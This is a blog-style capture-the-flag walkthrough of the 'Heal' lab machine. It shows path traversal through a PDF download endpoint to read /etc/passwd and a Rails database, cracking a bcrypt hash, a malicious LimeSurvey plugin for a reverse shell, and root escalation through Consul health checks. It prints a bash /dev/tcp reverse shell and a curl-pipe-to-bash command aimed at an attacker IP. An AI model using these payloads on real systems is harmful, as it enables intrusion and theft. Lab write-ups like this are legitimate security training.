@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Medium - Heal - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Medium - Heal</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1734302367577"
+                  >2024-12-15 23:39</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1748423106054"
+                  >2025-05-28 11:05</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p><img src="/_resources/4af11adbab88413e803160b19d4947b2.png" /></p>
+<div><pre class="hljs"><code>└──╼ $whatweb heal.htb
+http://heal.htb <span class="hljs-comment">[200 OK]</span> Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, HTML5, HTTPServer<span class="hljs-comment">[Ubuntu Linux]</span><span class="hljs-comment">[nginx/1.18.0 (Ubuntu)]</span>, IP<span class="hljs-comment">[10.129.110.223]</span>, Script, Title<span class="hljs-comment">[Heal]</span>, X-Powered-By<span class="hljs-comment">[Express]</span>, nginx<span class="hljs-comment">[1.18.0]</span></code></pre></div>
+<div><pre class="hljs"><code>└──╼ $nmap -p- -A heal.htb
+Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-12</span><span class="hljs-number">-15</span> <span class="hljs-number">22</span>:<span class="hljs-number">40</span> UTC
+Nmap scan report <span class="hljs-keyword">for</span> heal.htb (<span class="hljs-number">10.129</span><span class="hljs-number">.110</span><span class="hljs-number">.223</span>)
+Host is up (<span class="hljs-number">0.050</span>s latency).
+Not shown: <span class="hljs-number">65533</span> closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh     OpenSSH <span class="hljs-number">8.9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0<span class="hljs-number">.10</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-hostkey: 
+|   <span class="hljs-number">256</span> <span class="hljs-number">68</span>:af:<span class="hljs-number">80</span>:<span class="hljs-number">86</span>:<span class="hljs-number">6</span>e:<span class="hljs-number">61</span>:<span class="hljs-number">7</span>e:bf:<span class="hljs-number">0</span>b:ea:<span class="hljs-number">10</span>:<span class="hljs-number">52</span>:d7:<span class="hljs-number">7</span><span class="hljs-keyword">a</span>:<span class="hljs-number">94</span>:<span class="hljs-number">3</span>d (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-number">52</span>:f4:<span class="hljs-number">8</span>d:f1:c7:<span class="hljs-number">85</span>:b6:<span class="hljs-number">6</span>f:c6:<span class="hljs-number">5</span>f:b2:db:a6:<span class="hljs-number">17</span>:<span class="hljs-number">68</span>:ae (ED25519)
+<span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    nginx <span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (Ubuntu)
+|<span class="hljs-title">_http-title</span>: Heal
+|<span class="hljs-title">_http-server-header</span>: nginx/<span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .
+Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">22.95</span> <span class="hljs-built_in">seconds</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-section">└──╼ $gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://heal.htb  --append-domain -t 150
+===============================================================</span>
+Gobuster v3.6
+<span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================</span>
+[+] Url:             http://heal.htb
+[+] Method:          GET
+[+] Threads:         150
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: api.heal.htb Status: 200 [Size: 12515]
+Found: API.heal.htb Status: 200 [Size: 12515]
+Found: Api.heal.htb Status: 200 [Size: 12515]</code></pre></div>
+<h1 id="main-site">Main site</h1>
+<p>After creating an account, we are greeted with resume builder.</p>
+<p><img src="/_resources/3f2d8c1fb55040669f7816278330093c.png" /></p>
+<p>It can be exported to pdf.</p>
+<p><img src="/_resources/198a41ca10fb47c4bdfb7eb277bbdbb6.png" /></p>
+<p>In burp we can modify the contents field to generate any pdf we want.</p>
+<p><img src="/_resources/5bec932169054eddb7479b8708fe17f8.png" /></p>
+<p>Exploring the site we can aslo find survey under a new subdomain, <code>take-survey.heal.htb</code>.</p>
+<p>We can also see that all of the actions are done through an api. Running <code>curl api.heal.htb</code> gets us:</p>
+<div><pre class="hljs"><code>    <span class="hljs-section">&lt;li&gt;</span><span class="hljs-section">&lt;strong&gt;</span><span class="hljs-attribute">Rails</span> version:&lt;/strong&gt; <span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">4</span>&lt;/li&gt;
+    <span class="hljs-section">&lt;li&gt;</span><span class="hljs-section">&lt;strong&gt;</span><span class="hljs-attribute">Ruby</span> version:&lt;/strong&gt; ruby <span class="hljs-number">3</span>.<span class="hljs-number">3</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">03</span> revision ef084cc8f4)<span class="hljs-meta"> [x86_64-linux]&lt;/li&gt;</span></code></pre></div>
+<p>Testing for <code>https://api.heal.htb/?name=abc</code> gets us rails site.</p>
+<p><img src="/_resources/de710d3a5d6b44bd91153044e72a87d2.png" /></p>
+<h1 id="pdf-downloads">PDF downloads</h1>
+<p>Looking further in burp we can monitor how pdf’s are created. First file is sent to <code>/exports</code> and then we are downloading it from <code>/download</code>, i.e: <code>/download?filename=b8ee5207be6ef2a567c2.pdf</code></p>
+<p><img src="/_resources/90194eb158f9488db895d2a2ca3b100a.png" /></p>
+<p>We can test this for path traversal and try to download <code>../../../../../../../../../etc/passwd</code>. We get then pdf file, that opened in text editor looks like what we wanted.</p>
+<p><img src="/_resources/2bab1a40433445b6a636966c5f484e88.png" /></p>
+<p>Inspecting it we can see two users on our system, ralph and ron. www is ther as usual.</p>
+<div><pre class="hljs"><code><span class="hljs-symbol">ralph:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:ralph</span><span class="hljs-symbol">:/home/ralph</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">ron:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/ron</span><span class="hljs-symbol">:/bin/bash</span>
+www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span></code></pre></div>
+<p>Testing for <code>../../../../../../../../../home/{ron|ralph}/.ssh/id_rsa</code> get’s us nothing.<br />
+Further looking for files we can get crontab, but its unchanged. We can also get <code>../../../../../../../../../etc/nginx/nginx.conf</code>.</p>
+<div><pre class="hljs"><code>user www-data;
+worker_processes auto;
+pid <span class="hljs-regexp">/run/</span>nginx.pid;
+<span class="hljs-keyword">include</span> <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/modules-enabled/</span>*.conf;
+
+events {
+    worker_connections <span class="hljs-number">768</span>;
+    # multi_accept on;
+}
+
+http {
+    sendfile on;
+    tcp_nopush on;
+    types_hash_max_size <span class="hljs-number">2048</span>;
+
+    <span class="hljs-keyword">include</span> <span class="hljs-regexp">/etc/</span>nginx/mime.types;
+    default_type application/octet-stream;
+
+    ssl_protocols TLSv1 TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>; # Dropping SSLv3, ref: POODLE
+    ssl_prefer_server_ciphers on;
+
+    access_log <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log;
+    error_log <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>error.log;
+
+    gzip on;
+
+    <span class="hljs-keyword">include</span> <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf.d/</span>*.conf;
+    <span class="hljs-keyword">include</span> <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/sites-enabled/</span>*;
+}</code></pre></div>
+<p>We know that we are using ruby on rails. <a title="https://stackoverflow.com/questions/18279278/where-is-the-database-file-rails" href="https://stackoverflow.com/questions/18279278/where-is-the-database-file-rails">Looking online on stackoverflow</a> we can see that the default location of database is <code>config/database.yml</code>. Downloading a file under <code>../../config/database.yml</code> gets us:</p>
+<div><pre class="hljs"><code><span class="hljs-comment"># SQLite. Versions 3.8.0 and up are supported.</span>
+<span class="hljs-comment">#   gem install sqlite3</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment">#   Ensure the SQLite 3 gem is defined in your Gemfile</span>
+<span class="hljs-comment">#   gem "sqlite3"</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-attr">default:</span> <span class="hljs-meta">&amp;default</span>
+  <span class="hljs-attr">adapter:</span> <span class="hljs-string">sqlite3</span>
+  <span class="hljs-attr">pool:</span> &lt;%=<span class="language-ruby"> ENV.fetch(<span class="hljs-string">"RAILS_MAX_THREADS"</span>) { <span class="hljs-number">5</span> } </span>%&gt;
+  <span class="hljs-attr">timeout:</span> <span class="hljs-number">5000</span>
+
+<span class="hljs-attr">development:</span>
+  <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*default</span>
+  <span class="hljs-attr">database:</span> <span class="hljs-string">storage/development.sqlite3</span>
+
+<span class="hljs-comment"># Warning: The database defined as "test" will be erased and</span>
+<span class="hljs-comment"># re-generated from your development database when you run "rake".</span>
+<span class="hljs-comment"># Do not set this db to the same as development or production.</span>
+<span class="hljs-attr">test:</span>
+  <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*default</span>
+  <span class="hljs-attr">database:</span> <span class="hljs-string">storage/test.sqlite3</span>
+
+<span class="hljs-attr">production:</span>
+  <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*default</span>
+  <span class="hljs-attr">database:</span> <span class="hljs-string">storage/development.sqlite3</span></code></pre></div>
+<p>We can then get development database (located under <code>../../storage/development.sqlite3</code>) and finaly get user hash.</p>
+<p><img src="/_resources/76ec61811e4e4e0d8686a6f19473e56c.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-attribute">1</span>|ralph@heal.htb|$<span class="hljs-number">2</span>a$<span class="hljs-number">12</span>$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|<span class="hljs-number">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">27</span> <span class="hljs-number">07</span>:<span class="hljs-number">49</span>:<span class="hljs-number">31</span>.<span class="hljs-number">614858</span>|<span class="hljs-number">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">27</span> <span class="hljs-number">07</span>:<span class="hljs-number">49</span>:<span class="hljs-number">31</span>.<span class="hljs-number">614858</span>|Administrator|ralph|<span class="hljs-number">1</span></code></pre></div>
+<p>Running <code>hashcat -m 3200 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt</code> cracks us the hash.</p>
+<div><pre class="hljs"><code>hashcat <span class="hljs-attr">--show</span> -m <span class="hljs-number">3200</span> hash<span class="hljs-selector-class">.txt</span>
+$<span class="hljs-number">2</span>a$<span class="hljs-number">12</span><span class="hljs-variable">$dUZ</span>/O7KJT3<span class="hljs-selector-class">.zE4TOK8p4RuxH3t</span><span class="hljs-selector-class">.Bz45DSr7A94VLvY9SWx1GCSZnG</span>:<span class="hljs-number">147258369</span></code></pre></div>
+<p>So we have now creds: <code>ralph : 147258369</code></p>
+<p>It does not let us in on the ssh, so we have to dig deeper. We already abused main site and api subdomain, so now time for <code>take-survey.heal.htb</code>.<br />
+Running dirsearch gets us:</p>
+<div><pre class="hljs"><code>Target: http:<span class="hljs-regexp">//</span>take-survey.heal.htb/
+
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">23</span>] Starting: 
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">48</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/Admin/</span>  -&gt;  http:<span class="hljs-regexp">//</span>take-survey.heal.htb<span class="hljs-regexp">/index.php/</span>admin<span class="hljs-regexp">/authentication/</span>sa/login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">48</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>_logs<span class="hljs-regexp">/error_log  -&gt;  http:/</span><span class="hljs-regexp">/take-survey.heal.htb/i</span>ndex.php<span class="hljs-regexp">/admin/</span>authentication<span class="hljs-regexp">/sa/</span>login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">48</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>admin-login  -&gt;  http:<span class="hljs-regexp">//</span>take-survey.heal.htb<span class="hljs-regexp">/index.php/</span>admin<span class="hljs-regexp">/authentication/</span>sa/login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">48</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>admin.js  -&gt;  http:<span class="hljs-regexp">//</span>take-survey.heal.htb<span class="hljs-regexp">/index.php/</span>admin<span class="hljs-regexp">/authentication/</span>sa/login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">48</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>adminLogin.jsp  -&gt;  http:<span class="hljs-regexp">//</span>take-survey.heal.htb<span class="hljs-regexp">/index.php/</span>admin<span class="hljs-regexp">/authentication/</span>sa/login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>default<span class="hljs-regexp">/login.asp  -&gt;  http:/</span><span class="hljs-regexp">/take-survey.heal.htb/i</span>ndex.php<span class="hljs-regexp">/admin/</span>authentication<span class="hljs-regexp">/sa/</span>login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>fckeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/upload.asp  -&gt;  http:/</span><span class="hljs-regexp">/take-survey.heal.htb/i</span>ndex.php<span class="hljs-regexp">/admin/</span>authentication<span class="hljs-regexp">/sa/</span>login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>home  -&gt;  http:<span class="hljs-regexp">//</span>take-survey.heal.htb<span class="hljs-regexp">/index.php/</span>admin<span class="hljs-regexp">/authentication/</span>sa/login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/i</span>ndex.html  -&gt;  http:<span class="hljs-regexp">//</span>take-survey.heal.htb<span class="hljs-regexp">/index.php/</span>admin<span class="hljs-regexp">/authentication/</span>sa/login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>login.jsp  -&gt;  http:<span class="hljs-regexp">//</span>take-survey.heal.htb<span class="hljs-regexp">/index.php/</span>admin<span class="hljs-regexp">/authentication/</span>sa/login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>logs<span class="hljs-regexp">/access.log  -&gt;  http:/</span><span class="hljs-regexp">/take-survey.heal.htb/i</span>ndex.php<span class="hljs-regexp">/admin/</span>authentication<span class="hljs-regexp">/sa/</span>login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/m</span>anage<span class="hljs-regexp">/login.asp  -&gt;  http:/</span><span class="hljs-regexp">/take-survey.heal.htb/i</span>ndex.php<span class="hljs-regexp">/admin/</span>authentication<span class="hljs-regexp">/sa/</span>login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>pma<span class="hljs-regexp">/  -&gt;  http:/</span><span class="hljs-regexp">/take-survey.heal.htb/i</span>ndex.php<span class="hljs-regexp">/admin/</span>authentication<span class="hljs-regexp">/sa/</span>login
+[<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>sxd<span class="hljs-regexp">/  -&gt;  http:/</span><span class="hljs-regexp">/take-survey.heal.htb/i</span>ndex.php<span class="hljs-regexp">/admin/</span>authentication<span class="hljs-regexp">/sa/</span>login</code></pre></div>
+<p>Using ralphs creds let’s us in.</p>
+<p><img src="/_resources/cf80d8824d4546fe93fb073a89876e13.png" /></p>
+<p>We can then add plugin, activate it and get reverse shell by entering the site. Malicious plugin can be found on <a title="http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php" href="http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php">github</a>. It is important to add version 6.6.4 to the config.xml file, otherwise we will get version mismatch. We get logged in as www-data.</p>
+<p>For QoL we can stabilize the shell.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=xterm
+CTRL-Z
+stty<span class="hljs-built_in"> raw </span>-echo; fg</code></pre></div>
+<h1 id="priv-esc">Priv esc</h1>
+<div><pre class="hljs"><code>www-data@heal:/tmp$ ss -tulpn
+Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                 
+udp   UNCONN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>         127.0.0.1:8600       0.0.0.0:*                                                           
+udp   UNCONN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>           0.0.0.0:39855      0.0.0.0:*                                                           
+udp   UNCONN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>           0.0.0.0:5353       0.0.0.0:*                                                           
+udp   UNCONN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>     127.0.0.53%lo:53         0.0.0.0:*                                                           
+udp   UNCONN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>           0.0.0.0:68         0.0.0.0:*                                                           
+udp   UNCONN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>         127.0.0.1:8301       0.0.0.0:*                                                           
+udp   UNCONN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>         127.0.0.1:8302       0.0.0.0:*                                                           
+udp   UNCONN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>              [::]:5353          [::]:*                                                           
+udp   UNCONN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>              [::]:39087         [::]:*                                                           
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 128 </span>         0.0.0.0:22         0.0.0.0:*                                                           
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 511 </span>         0.0.0.0:80         0.0.0.0:*    
+
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 244 </span>       127.0.0.1:5432       0.0.0.0:*                                                           
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 1024 </span>      127.0.0.1:3001       0.0.0.0:*                                                           
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 511 </span>       127.0.0.1:3000       0.0.0.0:*                                                           
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 4096 </span>      127.0.0.1:8302       0.0.0.0:*                                                           
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 4096 </span>      127.0.0.1:8301       0.0.0.0:*                                                           
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 4096 </span>      127.0.0.1:8300       0.0.0.0:*                                                           
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 4096 </span>      127.0.0.1:8600       0.0.0.0:*                                                           
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 4096 </span>  127.0.0.53%lo:53         0.0.0.0:*                                                           
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 4096 </span>      127.0.0.1:8503       0.0.0.0:*                                                           
+tcp   LISTEN<span class="hljs-number"> 0 </span>    <span class="hljs-number"> 4096 </span>      127.0.0.1:8500       0.0.0.0:*                                                           
+              </code></pre></div>
+<p>using chatgpt for quick check:</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">UDP</span> <span class="hljs-number">127.0.0.1:8600</span> - Consul DNS queries or local DNS service
+<span class="hljs-attribute">UDP</span> <span class="hljs-number">0.0.0.0:39855</span> - Ephemeral port for temporary connections
+<span class="hljs-attribute">UDP</span> <span class="hljs-number">0.0.0.0:5353</span> - Multicast DNS (mDNS)
+<span class="hljs-attribute">UDP</span> <span class="hljs-number">127.0.0.53:53</span> - Local DNS resolver (systemd-resolved)
+<span class="hljs-attribute">UDP</span> <span class="hljs-number">0.0.0.0:68</span> - DHCP client
+<span class="hljs-attribute">UDP</span> <span class="hljs-number">127.0.0.1:8301</span> - Consul gossip protocol
+<span class="hljs-attribute">UDP</span> <span class="hljs-number">127.0.0.1:8302</span> - Consul Serf communication
+<span class="hljs-attribute">UDP6</span> :::<span class="hljs-number">5353</span> - Multicast DNS (mDNS over IPv6)
+<span class="hljs-attribute">UDP6</span> :::<span class="hljs-number">39087</span> - Ephemeral port for temporary connections</code></pre></div>
+<p>I’ve never heard of consul before, but it’s a <a title="https://www.consul.io/?product_intent=consul" href="https://www.consul.io/?product_intent=consul">product made by Hashicorp</a> for Identity-based networking.</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">www</span>-data@heal:/tmp$ consul version
+<span class="hljs-attribute">Consul</span> v1.<span class="hljs-number">19</span>.<span class="hljs-number">2</span>
+<span class="hljs-attribute">Revision</span> <span class="hljs-number">048</span>f1936
+<span class="hljs-attribute">Build</span> Date <span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">27</span>T16:<span class="hljs-number">06</span>:<span class="hljs-number">44</span>Z
+<span class="hljs-attribute">Protocol</span> <span class="hljs-number">2</span> spoken by default, understands <span class="hljs-number">2</span> to <span class="hljs-number">3</span> (agent will automatically use protocol &gt;<span class="hljs-number">2</span> when speaking to compatible agents)</code></pre></div>
+<p>We can see that it is running under root, so it’s a pretty lucrative target.</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">root</span>         <span class="hljs-number">991</span>  <span class="hljs-number">0</span>.<span class="hljs-number">6</span>  <span class="hljs-number">2</span>.<span class="hljs-number">6</span> <span class="hljs-number">1359780</span> <span class="hljs-number">105580</span> ?      Ssl  Dec15   <span class="hljs-number">6</span>:<span class="hljs-number">39</span> /usr/local/bin/consul agent -server -ui -advertise=<span class="hljs-number">127.0.0.1</span> -bind=<span class="hljs-number">127.0.0.1</span> -data-dir=/var/lib/consul -node=consul-<span class="hljs-number">01</span> -config-dir=/etc/consul.d
+<span class="hljs-attribute">www</span>-data   <span class="hljs-number">55875</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>  <span class="hljs-number">0</span>.<span class="hljs-number">0</span>   <span class="hljs-number">6828</span>  <span class="hljs-number">2032</span> pts/<span class="hljs-number">0</span>    S+   <span class="hljs-number">16</span>:<span class="hljs-number">59</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> grep consul</code></pre></div>
+<p>From there it’s easy. It turns out that there is a way to execute arbitrary code using consule.</p>
+<ol>
+<li>Create reverse shell file i.e</li>
+</ol>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+bash -i &gt;&amp; /dev/tcp/10.10.16.21/4444 0&gt;&amp;1</code></pre></div>
+<ol start="2">
+<li>setup a server to host the file with <code>sudo http-server -p 80</code>.</li>
+<li>setup listiner with <code>nc -lvnp 4444</code></li>
+<li>setup malicious health check</li>
+</ol>
+<div><pre class="hljs"><code>curl -<span class="hljs-keyword">X</span> PUT -<span class="hljs-keyword">d</span> '{
+  <span class="hljs-string">"Name"</span>: <span class="hljs-string">"malicious-check"</span>,
+  <span class="hljs-string">"Args"</span>: [<span class="hljs-string">"/bin/bash"</span>, <span class="hljs-string">"-c"</span>, <span class="hljs-string">"curl http://10.10.16.21/shell.sh | bash"</span>],
+  <span class="hljs-string">"Interval"</span>: <span class="hljs-string">"10s"</span>
+}' http:<span class="hljs-comment">//127.0.0.1:8500/v1/agent/check/register</span></code></pre></div>
+<ol start="6">
+<li>run healthchecks with <code>curl http://127.0.0.1:8500/v1/health/state/any</code>.</li>
+</ol>
+<p>We are in as root. It’s possible that it did skip an exploit that was intended for user, but root is root.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
